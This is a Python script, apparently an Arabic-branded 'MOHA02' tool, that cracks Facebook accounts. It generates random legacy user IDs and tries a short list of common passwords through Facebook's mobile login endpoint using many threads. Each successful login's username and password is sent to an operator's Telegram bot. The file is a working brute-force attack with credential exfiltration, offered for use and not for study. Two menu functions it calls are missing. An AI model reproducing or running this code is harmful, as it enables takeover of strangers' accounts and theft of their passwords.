# -*- coding: utf-8 -*-
import os, sys, time, requests, random, uuid, threading
from concurrent.futures import ThreadPoolExecutor

G = '\033[1;32m' 
R = '\033[1;31m' 
Y = '\033[1;33m' 
B = '\033[1;34m' 
P = '\033[1;35m' 
C = '\033[1;36m' 
W = '\033[1;37m' 

hits, cp, bad, loop = 0, 0, 0, 0
stop_check = False

def logo():
    os.system('clear')
    print(f"""
{B}   __  __  ____  _   _    _      ___ ____  
{B}  |  \/  |/ __ \| | | |  / \    / _ \___ \ 
{P}  | |\/| | |  | | |_| | / _ \  | | | |__) |
{P}  | |  | | |__| |  _  |/ ___ \ | |_| / __/ 
{G}  |_|  |_|\____/|_| |_/_/   \_\ \___/_____|
{G}       SYSTEM V4.5 - BY MOHA AL-SHALFAWI
{Y}--------------------------------------------------""")

def login_fb(user, pw, chat_id, bot_token):
    global hits, cp, bad, stop_check, loop
    if stop_check: return

    ua = "Dalvik/2.1.0 (Linux; U; Android 11; RMX3263) [FBAN/FB4A;FBAV/450.0.0.45.109;]"
    url = "https://b-graph.facebook.com/auth/login"
    data = {
        "email": user, "password": pw,
        "access_token": "350685531728|62f8ce9f74b12f84c123cc23437a4a32",
        "api_key": "882a8490361da98702bf97a021ddc14d",
        "method": "auth.login", "format": "json"
    }
    
    try:
        res = requests.post(url, data=data, headers={"User-Agent": ua}, timeout=10).json()
        if "session_key" in res:
            hits += 1
            print(f"\r{G}[MOHA-HIT] {user} | {pw}                     ")
            requests.post(f"https://api.telegram.org/bot{bot_token}/sendMessage?chat_id={chat_id}&text=🔥 MOHA HIT!\nUser: {user}\nPass: {pw}")
        elif "www.facebook.com" in str(res):
            cp += 1
            print(f"\r{Y}[MOHA-CP] {user} | {pw}                      ")
        elif "Calls to this api have exceeded" in str(res) or "403" in str(res):
            stop_check = True
            print(f"\n{R}[!] API BANNED! Use Airplane Mode & Retry.")
        else:
            bad += 1
            sys.stdout.write(f"\r{W}[MOHA02 🖤] {loop}/{hits}/{cp} | {user} "); sys.stdout.flush()
    except: pass

def tool_old_hunting():
    global stop_check, loop
    stop_check = False
    loop = 0
    logo()
    print(f"{C}[1] {W}2004-2005 {C}[2] {W}2009 {C}[3] {W}2010-2012 {C}[4] {W}2013-2014")
    year = input(f"\n{G}[+] Select Year: {P}")
    limit = int(input(f"{G}[+] Crack Limit (IDs): {P}"))
    bot_token = input(f"{G}[+] Bot Token: {B}")
    chat_id = input(f"{G}[+] Chat ID: {B}")
    
    passwords = ['123456', '1234567', '12345678', '123456789', '123123', '321321', 'password']
    
    print(f"{Y}[*] Hunting Started...")
    with ThreadPoolExecutor(max_workers=35) as pool:
        while loop < limit:
            if stop_check: break
            if year == '1': 
                uid = str(random.randint(100000, 99000000))
            elif year == '2': 
                uid = "100000" + str(random.randint(400000000, 999999999))
            elif year == '3': 
                uid = "100001" + str(random.randint(100000000, 999999999))
            elif year == '4': 
                uid = "100005" + str(random.randint(100000000, 999999999))
            else: break
            
            pool.submit(login_fb, uid, random.choice(passwords), chat_id, bot_token)
            loop += 1
            
    print(f"\n{G}[+] Finished!")
    time.sleep(3)

def main():
    while True:
        logo()
        print(f"{C}[1] {W}Extract IDs (Cookie -> File)")
        print(f"{C}[2] {W}Check ID File (Custom Pass)")
        print(f"{C}[3] {W}Old ID Hunting (Auto)")
        print(f"{R}[0] {W}Exit")
        
        choice = input(f"\n{G}MOHA-02 > {P}")
        if choice == '1': tool_extract() # دالة السحب تبقى كما هي
        elif choice == '2': tool_check_file() # دالة الملف تبقى كما هي
        elif choice == '3': tool_old_hunting()
        elif choice == '0': sys.exit()

if __name__ == "__main__":
    main()
